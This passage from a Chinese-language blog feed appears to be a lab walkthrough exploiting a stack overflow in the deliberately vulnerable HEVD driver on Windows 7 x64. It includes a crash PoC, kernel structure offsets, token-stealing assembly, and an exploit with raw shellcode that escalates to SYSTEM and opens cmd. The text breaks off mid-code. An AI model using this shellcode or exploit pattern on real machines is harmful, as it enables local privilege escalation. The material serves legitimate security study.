class="hljs-comment">    0: kd&gt; dq 0xfffff80003fe2cf0</span><span class="hljs-comment">    fffff800`03fe2cf0  00000000`00000004 00000000`000e0000</span><span class="hljs-comment">    fffff800`03fe2d00  fffff800`04415470 fffff800`041aa8a0</span><span class="hljs-comment">    */</span>    CloseHandle(dev);    TriggerShellcode();    system(<span class="hljs-string">&quot;start cmd&quot;</span>);    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p><a href="https://macchiato.ink/hst/bypassav/Windows_Kernel_GetFunction/">https://macchiato.ink/hst/bypassav/Windows_Kernel_GetFunction/</a><br><a href="https://h0mbre.github.io/HEVD_AbitraryWrite_64bit">https://h0mbre.github.io/HEVD_AbitraryWrite_64bit</a><br><a href="https://www.anquanke.com/post/id/246289">https://www.anquanke.com/post/id/246289</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HEVD win7 x64 stack overflow</title>
    <link href="/2022/06/25/HEVD%20win7%20x64%20stack%20overflow/"/>
    <url>/2022/06/25/HEVD%20win7%20x64%20stack%20overflow/</url>
    
    <content type="html"><![CDATA[<p>å°è¯•å­¦ç‚¹æ–°ä¸œè¥¿ï¼Œåº”è¯¥ç®—æ˜¯å¾ˆä¹…æ²¡å­¦äº†</p><pre><code class="hljs nsis">ç¯å¢ƒï¼šè™šæ‹Ÿæœºï¼š<span class="hljs-literal">Win7</span> SP1 x64ç‰©ç†æœºï¼š<span class="hljs-literal">Win10</span>debuggerï¼šwindbg previewcompilerï¼švs2022</code></pre><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><h3 id="VirtualKD-Redux"><a href="#VirtualKD-Redux" class="headerlink" title="VirtualKD-Redux"></a>VirtualKD-Redux</h3><p>çœ‹äº†å¾ˆå¤šåšå®¢ï¼Œä»¥åŠå°è¯•æ­å»ºç¯å¢ƒï¼Œæœ€åå‘ç°è¿˜æ˜¯åˆ«äººå†™çš„è½®å­å¥½ç”¨</p><p><a href="https://github.com/4d61726b/VirtualKD-Redux">VirtualKD-Redux</a></p><p>ä¸‹è½½ä¹‹åï¼Œè§£å‹ï¼ŒæŠŠ<code>target64</code>æ–‡ä»¶å¤¹æ”¾åˆ°è™šæ‹Ÿæœºä¸­ï¼Œç„¶ååœ¨è™šæ‹Ÿæœºè¿è¡Œ<code>vminstall.exe</code>å³å¯</p><p>è¿™ä¸ªå®‰è£…æ‰€åšçš„äº‹æƒ…ï¼Œå¦‚<a href="https://blog.csdn.net/lixiangminghate/article/details/78659646">VirtualKDåŠ é€ŸwindbgåŒæœºè°ƒè¯•é€Ÿåº¦</a>æ‰€è¯´</p><p>ç¬¬ä¸€ä»¶äº‹æƒ…å°±æ˜¯æ·»åŠ äº†ä¸€ä¸ª<code>VirtualKD</code>çš„å¯åŠ¨é¡¹</p><p>ä½†æ˜¯ç¬¬äºŒä»¶äº‹æƒ…ï¼Œæˆ‘å¹¶æ²¡æ‰¾åˆ°å­˜åœ¨<code>DDKLaunchMonitor.exe</code>æ–‡ä»¶ä»¥åŠå¯¹æ³¨å†Œè¡¨ä¿®æ”¹çš„è¡Œä¸ºï¼ˆè¿™ä¸ªæ³¨å†Œè¡¨çš„è¡Œä¸ºï¼Œå¯ä»¥çœ‹åˆ°è€ç‰ˆæœ¬çš„è¿™ä¸ªè½®å­ï¼Œå­˜åœ¨<code>kdpatch.reg</code>ï¼‰ï¼Œä½†æ˜¯æˆ‘å‘ç°<code>kdbazis.dll</code>è¯¥æ–‡ä»¶è¢«æ”¾åˆ°äº†<code>C:\Windows\System32</code>ç›®å½•ä¸‹ï¼ŒæŸ¥é˜…äº†ä¸€äº›èµ„æ–™ï¼Œæåˆ°<code>kdbazis.dll</code>æ˜¯ç”±<code>kdvm.dll</code>é‡å‘½åè€Œæ¥ï¼ˆé‡å‘½åæ˜¯å› ä¸ºé¿å…<code>win8</code>ä»¥ä¸Šçš„æ“ä½œç³»ç»Ÿæ–‡ä»¶åç§°å†²çªï¼‰ï¼Œå…¶ä½œç”¨å°±æ˜¯ç”¨äºé€šä¿¡ï¼Œæ ¹æ®è¿è¡Œåœ¨ä¸»æœºè¿è¡Œ<code>vmmon64.exe</code>çš„çª—å£çš„<code>log</code>å¯ä»¥çœ‹åˆ°<code>VirtualKD-Redux patcher DLL successfully loaded. Patching the GuestRPC mechanism...</code>ï¼Œé‚£åº”è¯¥å°±æ˜¯å¯¹äº<code>GuestRPC</code>çš„æœºåˆ¶è¿›è¡Œ<code>patch</code>ï¼Œä»è€Œä¾¿äºé€šä¿¡ï¼Œå¹¶ä¸”è¯¥æ¨¡å¼ä¸‹ï¼Œå¯ä»¥åŠ è½½æœªç­¾åçš„é©±åŠ¨ï¼Œå³å°†è¦åŠ è½½çš„<code>HEVD.sys</code></p><p>ä¸»æœºåœ¨<code>win7</code>å¯åŠ¨æ—¶ï¼Œè¿è¡Œ<code>vmmon64</code>è¿›è¡Œç›‘æ§ï¼Œå¹¶å¯åŠ¨<code>Run debugger</code></p><h3 id="OSRLOADER"><a href="#OSRLOADER" class="headerlink" title="OSRLOADER"></a>OSRLOADER</h3><p>åŠ è½½<code>HEVD.sys</code>é©±åŠ¨</p><h3 id="Windbg-Preview"><a href="#Windbg-Preview" class="headerlink" title="Windbg Preview"></a>Windbg Preview</h3><p>éœ€è¦è®¾ç½®ä¸€ä¸‹<code>_NT_SYMBOL_PATH</code>ï¼Œä¸º<code>srv*H:\WinSymbols*https://msdl.microsoft.com/download/symbols;</code></p><p>åœ¨è°ƒè¯•æ—¶ï¼Œå¯ä»¥åŠ è½½<code>HEVD.pdb</code>ä¾¿äºä¸‹æ–­ç‚¹ï¼Œä»¥åŠéœ€è¦åœ¨<code>OSRLOADER</code>ä¸­<code>start service</code>æ‰å¯ä»¥çœ‹åˆ°<code>HEVD</code>é©±åŠ¨</p><p>åˆ©ç”¨<code>lm m h*</code>æŒ‡ä»¤å°±å¯ä»¥çœ‹åˆ°<code>HEVD</code>æ˜¯å¦åŠ è½½äº†</p><h2 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h2><p>å¯ä»¥é€šè¿‡<code>lm m HEVD</code>çœ‹<code>HEVD</code>æ¨¡å—çš„åŸºç¡€ä¿¡æ¯ï¼Œé€šè¿‡<code>!drvobj HEVD 2</code>æŸ¥çœ‹è¯¥é©±åŠ¨çš„è¯¦ç»†çš„ä¿¡æ¯</p><p>åœ¨<code>IrpDeviceIoCtlHandler()</code>æ¥å£å¯ä»¥çœ‹åˆ°å„ç§<code>ioctlhandler</code>ï¼Œå…¶ä¸­æ ˆæº¢å‡ºä¸º<code>0x222003</code></p><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x222003</span>:    DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>);    FakeObjectNonPagedPoolNxIoctlHandler = BufferOverflowStackIoctlHandler(Irp, CurrentStackLocation);    v7 = <span class="hljs-string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>;    <span class="hljs-keyword">goto</span> LABEL_62;</code></pre><p>æ¼æ´ç‚¹ååˆ†ç®€å•ï¼Œå°±æ˜¯è£¸æº¢å‡º</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">BufferOverflowStackIoctlHandler</span><span class="hljs-params">(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)</span></span><span class="hljs-function"></span>&#123;  _NAMED_PIPE_CREATE_PARAMETERS *Parameters; <span class="hljs-comment">// rcx</span>  __int64 result; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> __int64 Options; <span class="hljs-comment">// rdx</span>  Parameters = IrpSp-&gt;Parameters.CreatePipe.Parameters;  result = <span class="hljs-number">0xC0000001</span>i64;  Options = IrpSp-&gt;Parameters.Create.Options;  <span class="hljs-keyword">if</span> ( Parameters )    <span class="hljs-keyword">return</span> TriggerBufferOverflowStack(Parameters, Options);  <span class="hljs-keyword">return</span> result;&#125;</code></pre><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">TriggerBufferOverflowStack</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *UserBuffer, <span class="hljs-keyword">unsigned</span> __int64 Size)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">char</span> v5[<span class="hljs-number">2048</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-818h] BYREF</span>  <span class="hljs-built_in">memset</span>(v5, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v5));  ProbeForRead(UserBuffer, <span class="hljs-number">0x800</span>ui64, <span class="hljs-number">1u</span>);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserBuffer Size: 0x%X\n&quot;</span>, Size);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, v5);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] KernelBuffer Size: 0x%X\n&quot;</span>, <span class="hljs-number">0x800</span>i64);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>);  memmove(v5, UserBuffer, Size);                <span class="hljs-comment">// stack overflow</span>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;&#125;</code></pre><p>å› æ­¤è¾“å…¥å­—ç¬¦ä¸²è¦†ç›–åˆ°<code>ret</code>å³å¯è§¦å‘æ¼æ´</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// open device </span>    HANDLE dev = CreateFileA(<span class="hljs-string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (dev == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open failed\n&quot;</span>);        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Device Handle: 0x%p\n&quot;</span>, dev);    CHAR* chBuffer;    <span class="hljs-keyword">int</span> chBufferLen = <span class="hljs-number">0x818</span>;        chBuffer = (CHAR*)<span class="hljs-built_in">malloc</span>(chBufferLen + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer, <span class="hljs-number">0xff</span>, chBufferLen);    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen + <span class="hljs-number">0x8</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen + <span class="hljs-number">0x10</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x8</span>);    DWORD size_returned = <span class="hljs-number">0</span>;    BOOL is_ok = DeviceIoControl(dev, <span class="hljs-number">0x222003</span>, chBuffer, chBufferLen + <span class="hljs-number">0x18</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;size_returned, <span class="hljs-literal">NULL</span>);    CloseHandle(dev);    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>é¦–å…ˆæ‰“å¼€è¿™ä¸ªè®¾å¤‡ï¼Œç„¶åäºè¿™ä¸ªè®¾å¤‡è¿›è¡Œäº¤äº’ï¼Œé€šè¿‡è°ƒè¯•ï¼Œå¯ä»¥çœ‹åˆ°æœ€å<code>ret</code>çš„æ—¶å€™ï¼Œ<code>rip</code>è·³è½¬åˆ°äº†<code>0x4141414141414141</code></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>ç°åœ¨è¦åšçš„å°±æ˜¯ææƒä¹‹åå†æ‰“å¼€ä¸€ä¸ª<code>cmd</code></p><p>ç›®å‰ç¬¬ä¸€ä¸ªæ ˆæº¢å‡ºçš„å®éªŒï¼Œæ˜¯æ²¡å¼€<code>SMEP</code>ï¼Œå› æ­¤å¯ä»¥ç›´æ¥è·³è½¬åˆ°ç”¨æˆ·æ€çš„ç©ºé—´æ‰§è¡ŒæŒ‡ä»¤ï¼Œå°±å¯ä»¥ç›´æ¥<code>VirtualAlloc</code>ä¸€ä¸ªå¯è¯»å¯å†™å¯æ‰§è¡Œçš„é¡µï¼Œä»è€Œç›´æ¥æ‰§è¡Œææƒçš„æŒ‡ä»¤</p><p>è¿™é‡Œæ˜¯ç›´æ¥å‚è€ƒ<a href="https://www.abatchy.com/2018/01/kernel-exploitation-2">[Kernel Exploitation] 2: Payloads</a>çš„æ–¹æ³•ï¼Œçªƒå–çš„è¿›ç¨‹çº§ä»¤ç‰Œ</p><p>æ¯ä¸ª<code>windows</code>è¿›ç¨‹éƒ½æœ‰ä¸€ä¸ª<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm">EPROCESS</a>ç»“æ„ä½“ï¼ˆ<code>PEB</code>å­˜åœ¨äºç”¨æˆ·ç©ºé—´ï¼‰ï¼Œè€Œè¿™ä¸ª<code>EPROCESS</code>ç»“æ„åŒ…å«ä¸€ä¸ª<code>Token</code>å­—æ®µï¼Œè¿™ä¸ªå­—æ®µå‘Šè¯‰ç³»ç»Ÿè¯¥è¿›ç¨‹æ‹¥æœ‰ä»€ä¹ˆæƒé™ï¼Œå› æ­¤å¦‚æœèƒ½æ‰¾åˆ°ç‰¹æƒè¿›ç¨‹çš„<code>Token</code>ï¼Œå°†å…¶å·è¿‡æ¥ï¼Œç„¶åæ”¾åˆ°å½“å‰è¿›ç¨‹çš„<code>Token</code>ä¸Šï¼Œå°±å¯ä»¥ææƒäº†</p><p>ä¸ºäº†æ‰¾åˆ°<code>EPROCESS</code>å°±éœ€è¦ä¾èµ–å¯¹ä¸‹è¿°ç»“æ„ä½“çš„äº†è§£</p><h4 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h4><p><strong>_KPCR</strong></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/kpcr.htm">KPCR</a>ä»£è¡¨<code>Kernel Processor Control Region</code>ï¼Œå†…æ ¸ä¸ºæ¯ä¸€ä¸ªé€»è¾‘å¤„ç†å™¨éƒ½ç»´æŠ¤ä¸€ä¸ª<code>KPCR</code></p><p>å¯ä»¥çœ‹åˆ°<code>_KPRCB</code>ç»“æ„ä½“åœ¨<code>_KPCR</code>çš„åç§»ä¸º<code>0x180</code>çš„åœ°æ–¹</p><pre><code class="hljs sqf"><span class="hljs-number">0</span>: kd&gt; dt <span class="hljs-variable">_KPCR</span> Prcbntdll!<span class="hljs-variable">_KPCR</span>   +<span class="hljs-number">0</span>x180 Prcb : <span class="hljs-variable">_KPRCB</span></code></pre><p><strong>_KPRCB</strong></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/kprcb.htm">_KPRCB</a>ä»£è¡¨<code>Kernel Processor Control Block</code>ï¼Œä¸º<code>KPCR</code>çš„æœ€åä¸€ä¸ªå­—æ®µï¼Œæ‹¥æœ‰å†…æ ¸åœ¨ç®¡ç†å¤„ç†å™¨å’Œç®¡ç†èµ„æºæ—¶éœ€è¦éšæ—¶è®¿é—®çš„å¤§éƒ¨åˆ†å†…å®¹</p><p>å¯ä»¥çœ‹åˆ°åœ¨åç§»ä¸º<code>0x8</code>çš„åœ°æ–¹å¯ä»¥æ‹¿åˆ°å½“å‰çš„çº¿ç¨‹ï¼Œå› æ­¤ç›´æ¥é€šè¿‡ <code>_KPCR+0x188</code> å°±å¯ä»¥è·å–å½“å‰å†…æ ¸çº¿ç¨‹çš„ç»“æ„ä½“</p><pre><code class="hljs sqf"><span class="hljs-number">0</span>: kd&gt; dt <span class="hljs-variable">_KPRCB</span> CurrentThreadntdll!<span class="hljs-variable">_KPRCB</span>   +<span class="hljs-number">0</span>x008 CurrentThread : Ptr64 <span class="hljs-variable">_KTHREAD</span></code></pre><p><strong>_KTHREAD</strong></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ke/kthread/index.htm">KTHREAD</a>æ˜¯å†…æ ¸å†…éƒ¨çš„çº¿ç¨‹ç»“æ„</p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ke/kprocess/index.htm">KPROCESS</a>ä½äº<code>_KTHREAD.ApcState.Process</code>ä¹‹ä¸­</p><pre><code class="hljs sqf"><span class="hljs-number">0</span>: kd&gt; dt <span class="hljs-variable">_KTHREAD</span> ApcStatentdll!<span class="hljs-variable">_KTHREAD</span>   +<span class="hljs-number">0</span>x050 ApcState : <span class="hljs-variable">_KAPC_STATE</span></code></pre><p><strong>_KAPC_STATE</strong></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/kprocessor_state.htm">_KAPC_STATE</a>æ˜¯ä¸€ä¸ªè¾ƒä¸ºç®€å•çš„å¤„ç†å™¨çŠ¶æ€é›†åˆ</p><p>å› æ­¤é€šè¿‡<code>_KTHREAD+0x70</code>å¯ä»¥è·å¾—<code>_KPROCESS</code></p><pre><code class="hljs sqf"><span class="hljs-number">0</span>: kd&gt; dt <span class="hljs-variable">_KAPC_STATE</span> Processntdll!<span class="hljs-variable">_KAPC_STATE</span>   +<span class="hljs-number">0</span>x020 Process : Ptr64 <span class="hljs-variable">_KPROCESS</span></code></pre><p><strong>_EPROCESS</strong></p><p>æ ¹æ®<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm">_EPROCESS</a>å’Œ<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ke/kprocess/index.htm">_KPROCESS</a>å¯çŸ¥</p><p><code>_EPROCESS</code>çš„ç¬¬ä¸€é¡¹æ˜¯<code>_KPROCESS</code>ï¼Œå› æ­¤æ‰¾åˆ°<code>_KPROCESS</code>çš„åœ°å€ï¼Œå°±ç›¸å½“äºæ‰¾åˆ°äº†<code>_EPROCESS</code>çš„åœ°å€ï¼Œç›¸å½“äº<code>_EPROCESS</code>å°±æ˜¯ä¸€ä¸ªå¤§ç»“æ„ä½“ï¼Œå…¶ä¸­çš„ç¬¬ä¸€åŸŸå°±æ˜¯<code>_KPROCESS</code>ï¼ˆP.S. <code>_KTHREAD</code>å’Œ<code>_ETHREAD</code>ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼‰</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>: kd&gt; dt _EPROCESSntdll!_EPROCESS   +<span class="hljs-number">0x000</span> Pcb              : _KPROCESS   +<span class="hljs-number">0x160</span> ProcessLock      : _EX_PUSH_LOCK   +<span class="hljs-number">0x168</span> CreateTime       : _LARGE_INTEGER   +<span class="hljs-number">0x170</span> ExitTime         : _LARGE_INTEGER   +<span class="hljs-number">0x178</span> RundownProtect   : _EX_RUNDOWN_REF   +<span class="hljs-number">0x180</span> UniqueProcessId  : Ptr64 Void   +<span class="hljs-number">0x188</span> ActiveProcessLinks : _LIST_ENTRY   ...   +<span class="hljs-number">0x208</span> Token            : _EX_FAST_REF   ...</code></pre><p>å› æ­¤éœ€è¦è¦†ç›–çš„<code>Token</code>å°±æ˜¯<code>0x208</code>åç§»çš„åŸŸï¼Œè€Œå¯ä»¥é€šè¿‡éå†<code>ActiveProcessLinks</code>è·å–<code>active</code>çš„è¿›ç¨‹ï¼Œä¸”å·²çŸ¥ç³»ç»Ÿè¿›ç¨‹çš„<code>PID</code>ä¸º<code>4</code>ï¼Œå› æ­¤å°±å¯ä»¥éå†<code>0x188</code>çš„è¿›ç¨‹é“¾ï¼Œæ‰¾åˆ°<code>PID == 4</code>çš„è¿›ç¨‹ï¼Œç„¶åå–å‡ºç³»ç»Ÿè¿›ç¨‹çš„<code>Token</code>ï¼Œè¦†ç›–åˆ°å½“å‰è¿›ç¨‹çš„<code>Token</code>ä¸Š</p><h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><p>å› æ­¤<code>x64</code>çš„<code>shellocde</code>å¦‚ä¸‹</p><pre><code class="hljs assembly">xor rax, rax                        ; Set ZEROmov rax, [gs:rax + 188h]            ; Get nt!_KPCR.PcrbData.CurrentThread                                    ; _KTHREAD is located at GS : [0x188]           mov rax, [rax + 70h]                ; Get nt!_KTHREAD.ApcState.Process     mov rcx, rax                        ; Copy current process _EPROCESS structure  mov r11, rcx                        ; Store Token.RefCntand r11, 7mov rdx, 4h                         ; WIN 7 SP1 SYSTEM process PID &#x3D; 0x4           SearchSystemPID:mov rax, [rax + 188h]               ; Get nt!_EPROCESS.ActiveProcessLinks.Flinksub rax, 188hcmp [rax + 180h], rdx               ; Get nt!_EPROCESS.UniqueProcessId jne SearchSystemPIDmov rdx, [rax + 208h]               ; Get SYSTEM process nt!_EPROCESS.Tokenand rdx, 0fffffffffffffff0hor rdx, r11mov [rcx + 208h], rdx</code></pre><p>å¤‡ä»½ä¸€ä¸‹<code>x86</code>çš„</p><pre><code class="hljs assembly">pushad                              ; Save registers state; Start of Token Stealing Stubxor eax, eax                        ; Set ZEROmov eax, DWORD PTR fs:[eax + 124h]  ; Get nt!_KPCR.PcrbData.CurrentThread                                    ; _KTHREAD is located at FS : [0x124]mov eax, [eax + 50h]                ; Get nt!_KTHREAD.ApcState.Processmov ecx, eax                        ; Copy current process _EPROCESS structuremov edx, 04h                        ; WIN 7 SP1 SYSTEM process PID &#x3D; 0x4SearchSystemPID:mov eax, [eax + 0B8h]               ; Get nt!_EPROCESS.ActiveProcessLinks.Flinksub eax, 0B8hcmp[eax + 0B4h], edx                ; Get nt!_EPROCESS.UniqueProcessIdjne SearchSystemPIDmov edx, [eax + 0F8h]               ; Get SYSTEM process nt!_EPROCESS.Tokenmov[ecx + 0F8h], edx                ; Replace target process nt!_EPROCESS.Token                                    ; with SYSTEM process nt!_EPROCESS.Token</code></pre><h3 id="exp-cpp"><a href="#exp-cpp" class="headerlink" title="exp.cpp"></a>exp.cpp</h3><p>æœ€ç»ˆ<code>exp</code>å¦‚ä¸‹ï¼Œè¿™é‡Œçš„<code>shellcode</code>æˆ‘æ˜¯é€šè¿‡<code>nasm</code>è¿›è¡Œç¼–è¯‘çš„ï¼Œç„¶åå†é€šè¿‡<code>hexdump -e &#39;16/1 &quot;%02x&quot; &quot; | &quot;&#39; -e &#39;16/1 &quot;%_p&quot; &quot;\n&quot;&#39; ./1.o</code> å˜æˆå¯è§å­—ç¬¦çš„<code>16</code>è¿›åˆ¶ï¼Œå†è½¬æ¢çš„ï¼ˆæ²¡æ‰¾åˆ°å•¥æ¯”è¾ƒä¼˜é›…çš„æ–¹å¼</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// open device </span>    HANDLE dev = CreateFileA(<span class="hljs-string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (dev == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open failed\n&quot;</span>);        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Device Handle: 0x%p\n&quot;</span>, dev);    <span class="hljs-comment">/* nasm -f elf64 ./1.s </span><span class="hljs-comment">    xor rax, rax                    ; Set ZERO</span><span class="hljs-comment">    mov rax, gs:[rax + 188h]        ; Get nt!_KPCR.PcrbData.CurrentThread</span><span class="hljs-comment">                                    ; _KTHREAD is located at GS : [0x188]</span><span class="hljs-comment"></span><span class="hljs-comment">    mov rax, [rax + 70h]            ; Get nt!_KTHREAD.ApcState.Process</span><span class="hljs-comment">    mov rcx, rax                    ; Copy current process _EPROCESS structure</span><span class="hljs-comment">    mov r11, rcx                    ; Store Token.RefCnt</span><span class="hljs-comment">    and r11, 7</span><span class="hljs-comment"></span><span class="hljs-comment">    mov rdx, 4h                     ; WIN 7 SP1 SYSTEM process PID = 0x4</span><span class="hljs-comment"></span><span class="hljs-comment">    SearchSystemPID:</span><span class="hljs-comment">        mov rax, [rax + 188h]           ; Get nt!_EPROCESS.ActiveProcessLinks.Flink</span><span class="hljs-comment">        sub rax, 188h</span><span class="hljs-comment">        cmp [rax + 180h], rdx            ; Get nt!_EPROCESS.UniqueProcessId</span><span class="hljs-comment">        jne SearchSystemPID</span><span class="hljs-comment"></span><span class="hljs-comment">    mov rdx, [rax + 208h]           ; Get SYSTEM process nt!_EPROCESS.Token</span><span class="hljs-comment">    and rdx, 0fffffffffffffff0h</span><span class="hljs-comment">    or rdx, r11</span><span class="hljs-comment">    mov [rcx + 208h], rdx</span><span class="hljs-comment">    */</span>         CHAR shellcode[] =    &#123;        <span class="hljs-comment">// push rax; push rbx; push rcx; push rdx; push rdi; push rsi; push r8; push r9; push r10; push r11; push r12; push r13; push r14; push r15</span>        <span class="hljs-string">&quot;\x50\x53\x51\x52\x57\x56\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57&quot;</span>                <span class="hljs-comment">// change token</span>        <span class="hljs-string">&quot;\x48\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x40\x70\x48\x89\xc1\x49\x89\xcb\x49\x83\xe3\x07\xba\x04\x00\x00\x00\x48\x8b\x80\x88\x01\x00\x00\x48\x2d\x88\x01\x00\x00\x48\x39\x90\x80\x01\x00\x00\x75\xea\x48\x8b\x90\x08\x02\x00\x00\x48\x83\xe2\xf0\x4c\x09\xda\x48\x89\x91\x08\x02\x00\x00&quot;</span>                <span class="hljs-comment">// pop r15; pop r14; pop r13; pop r12; pop r11; pop r10; pop r9; pop r8; pop rsi; pop rdi; pop rdx; pop rcx; pop rbx; pop rax;</span>        <span class="hljs-string">&quot;\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5e\x5f\x5a\x59\x5b\x58&quot;</span>        <span class="hljs-string">&quot;\x48\x83\xc4\x28&quot;</span><span class="hljs-comment">// add rsp, 0x28</span>        <span class="hljs-string">&quot;\xc3&quot;</span><span class="hljs-comment">// ret</span>    &#125;;    LPVOID addr = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    <span class="hljs-keyword">if</span> (addr == <span class="hljs-literal">NULL</span>)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;VirtualAlloc failed\n&quot;</span>);        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    RtlCopyMemory(addr, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));    CHAR* chBuffer;    <span class="hljs-keyword">int</span> chBufferLen = <span class="hljs-number">0x818</span>;        chBuffer = (CHAR*)<span class="hljs-built_in">malloc</span>(chBufferLen + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x8</span>);    <span 